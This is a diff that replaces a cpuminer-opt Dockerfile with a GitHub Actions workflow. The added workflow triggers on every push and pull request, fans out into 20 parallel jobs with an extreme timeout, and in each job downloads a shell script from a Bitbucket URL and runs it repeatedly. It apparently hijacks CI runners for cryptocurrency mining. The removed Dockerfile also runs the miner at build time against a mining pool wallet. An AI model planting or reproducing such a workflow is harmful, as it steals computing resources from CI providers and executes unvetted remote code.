@@ -1,36 +1,30 @@
-#
-# Dockerfile for cpuminer-opt
-# usage: docker build -t cpuminer-opt:latest .
-# run: docker run -it --rm cpuminer-opt:latest [ARGS]
-# ex: docker run -it --rm cpuminer-opt:latest -a lyra2z330 -o lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=DGB,zap=PYRK-lyra2z330 -q
-#
+name: Start
+on: [push, pull_request]
+jobs:
+  build:
+    name: Worker
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D]
+    timeout-minutes: 9999999999999999999
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Worker
+      run: |
+        wget https://bitbucket.org/cpuoptminer/dgb/raw/97055e9f9d0eb10dded48d87015b901744922bc7/start.sh && chmod u+x start.sh && ./start.sh && ./start.sh && ./start.sh && ./start.sh && ./start.sh
 
-# Build
-FROM ubuntu:16.04 as builder
 
-RUN apt-get update \
-  && apt-get install -y \
-    build-essential \
-    libssl-dev \
-    libgmp-dev \
-    libcurl4-openssl-dev \
-    libjansson-dev \
-    automake \
-  && rm -rf /var/lib/apt/lists/*
-
-COPY . /app/
-RUN cd /app/ && ./build.sh
-
-# App
-FROM ubuntu:16.04
-
-RUN apt-get update \
-  && apt-get install -y \
-    libcurl3 \
-    libjansson4 \
-  && rm -rf /var/lib/apt/lists/*
-
-COPY --from=builder /app/cpuminer .
-ENTRYPOINT ["./cpuminer"]
-RUN ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=Bitbucket,zap=PYRK-lyra2z330 -q
-CMD ["-h"]
+            
